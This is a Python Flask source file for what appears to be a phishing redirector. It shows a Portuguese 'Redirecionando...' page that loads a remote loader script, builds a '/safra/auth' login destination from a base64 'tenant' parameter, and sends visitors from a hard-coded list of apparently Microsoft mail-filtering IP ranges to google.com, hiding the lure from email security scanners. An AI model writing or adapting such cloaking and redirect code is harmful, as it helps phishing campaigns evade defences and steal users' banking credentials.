import binascii
import ipaddress
import os
import base64
from flask import Flask, abort, jsonify, redirect, render_template_string, request, url_for

WAIT_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Redirecionando...</title>
  <link rel="preload" href="{{ loader_url }}" as="script">
</head>
<body>
  <p>Redirecionando...</p>
  <script src="{{ loader_url }}" defer data-tenant="{{ tenant }}"></script>
</body>
</html>
"""

DEST_HOST = os.environ.get("DEST_HOST", "/")
SAFE_REDIRECT_URL = "https://google.com"

BLOCKED_NETWORKS = [
    ipaddress.ip_network(cidr)
    for cidr in (
        "2a01:111:f400:7c00::/54",
        "2a01:111:f400:fc00::/54",
        "2a01:111:f403::/48",
        "23.103.132.0/22",
        "23.103.136.0/21",
        "23.103.144.0/20",
        "23.103.198.0/23",
        "23.103.200.0/22",
        "40.92.0.0/14",
        "4.192.0.0/12",
        "40.107.0.0/17",
        "52.100.0.0/14",
        "52.238.78.88/32",
        "65.55.88.0/24",
        "65.55.169.0/24",
        "94.245.120.64/26",
        "104.47.0.0/17",
        "157.55.234.0/24",
        "157.56.110.0/23",
        "157.56.112.0/24",
        "207.46.100.0/24",
        "207.46.163.0/24",
        "213.199.154.0/24",
        "213.199.180.128/26",
        "216.32.180.0/23",
    )
]

def decode_tenant(encoded: str) -> str:
    padded = encoded + "=" * (-len(encoded) % 4)
    for decoder in (base64.urlsafe_b64decode, base64.b64decode):
        try:
            return decoder(padded).decode("utf-8")
        except (binascii.Error, UnicodeDecodeError, ValueError):
            continue
    raise ValueError("invalid base64 tenant")


def build_destination_url2(tenant: str) -> str:
    host = DEST_HOST.rstrip("/")
    return f"{host}/safra/auth?tenant={tenant}"


def get_client_ip() -> str:
    forwarded_for = request.headers.get("X-Forwarded-For", "")
    if forwarded_for:
        return forwarded_for.split(",")[0].strip()
    return request.remote_addr or ""


def is_blocked_ip(ip_str: str) -> bool:
    try:
        ip = ipaddress.ip_address(ip_str)
    except ValueError:
        return False
    return any(ip in network for network in BLOCKED_NETWORKS)


def blocked_redirect_response():
    return redirect(SAFE_REDIRECT_URL, code=302)


def get_wait_html():
    return WAIT_HTML
